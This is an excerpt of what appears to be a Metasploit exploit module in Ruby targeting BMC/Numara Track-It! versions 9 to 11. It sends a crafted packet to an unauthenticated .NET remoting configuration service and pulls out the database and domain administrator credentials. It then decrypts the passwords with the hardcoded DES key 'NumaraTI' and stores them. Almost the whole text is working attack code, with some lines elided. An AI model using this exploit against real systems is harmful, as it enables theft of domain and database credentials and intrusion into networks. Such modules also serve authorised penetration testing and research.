...
'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server 
User Password Disclosure',
'Description' => %q{
This module exploits an unauthenticated configuration retrieval .NET 
remoting
service in Numara / BMC Track-It! v9 to v11.X, which can be abused to 
retrieve the Domain
...
#
# P.S.: Lots of fun stuff can be obtained from the response. Highlights 
include:
# - DatabaseServerName
# - DatabaseName
...
service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/,(bmc ? 
"Trackit" : "Numara.TrackIt"))
method = "GetProductDeploymentValues".gsub(/TrackIt/,(bmc ? "Trackit" : 
"Numara.TrackIt"))
...
PublicKeyToken=null".gsub(/TrackIt/,(bmc ? "TrackIt" : 
"Numara.TrackIt"))
...
rport, 'Context' => ctx })
if sock.nil?
fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport.to_s} - 
Failed to connect to remoting service")
else
print_status("#{rhost}:#{rport} - Sending packet to 
ConfigurationService...")
end
sock.write(packet)
# type of database (Oracle or SQL Server)
database_type = "DatabaseType"
# Database server name (host\sid for Oracle or host\login_name for SQL 
Server)
...
# We only break when we have a timeout (up to 15 seconds wait) or have 
all we need
while true
...
print_error("#{rhost}:#{rport} - Socket timed out after 15 seconds, try 
again if no credentials are dumped below.")
break
end
if packet_reply =~ /Service not found/
# This is most likely an older Numara version, re-do the packet and send 
again.
print_error("#{rhost}:#{rport} - Received \"Service not found\", trying 
again with new packet...")
sock.close
sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 
rport, 'Context' => ctx })
if sock.nil?
...
print_good("#{rhost}:#{rport} - Got database type: 
#{loot[database_type]}")
end
if loot[database_server_name]
print_good("#{rhost}:#{rport} - Got database server name: 
#{loot[database_server_name]}")
end
if loot[database_name]
print_good("#{rhost}:#{rport} - Got database name: 
#{loot[database_name]}")
end
if loot[schema_owner]
print_good("#{rhost}:#{rport} - Got database user name: 
#{loot[schema_owner]}")
end
if loot[database_pw]
...
cipher.iv = 'NumaraTI'
loot[database_pw] = 
cipher.update(Rex::Text.decode_base64(loot[database_pw]))
loot[database_pw] << cipher.final
print_good("#{rhost}:#{rport} - Got database password: 
#{loot[database_pw]}")
end
if loot[domain_admin_name]
print_good("#{rhost}:#{rport} - Got domain administrator username: 
#{loot[domain_admin_name]}")
end
...
cipher.key = 'NumaraTI'
cipher.iv = 'NumaraTI'
loot[domain_admin_pw] = 
cipher.update(Rex::Text.decode_base64(loot[domain_admin_pw]))
loot[domain_admin_pw] << cipher.final
print_good("#{rhost}:#{rport} - Got domain administrator password: 
#{loot[domain_admin_pw]}")
end
if loot[schema_owner] and loot[database_pw] and loot[database_type] and 
loot[database_server_name]
service_data = {
# database_server_name is the name of the host that is running the 
database.
# Due to limitations of the Credential API we cannot report a hostname 
but have to report a numeric IP.
# What this means in practice is that we might be reporting an incorrect 
address, as the database might
# be running in a different host than the one running the Track-It! 
application. However in most cases
# rhost == database_server_name as Track-It! is quite a lightweight app.
#
# Also we can't get the database port number from packet_reply, so set 
it to 0.
address: rhost,
port: 0,
...
print_status("#{rhost}:#{rport} - Stored SQL credentials: 
#{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
end
...
login_data.merge!(service_data)
create_credential_login(login_data)
print_status("#{rhost}:#{rport} - Stored domain credentials: 
#{loot[domain_admin_name]}:#{loot[domain_admin_pw]}")
end
nd
end
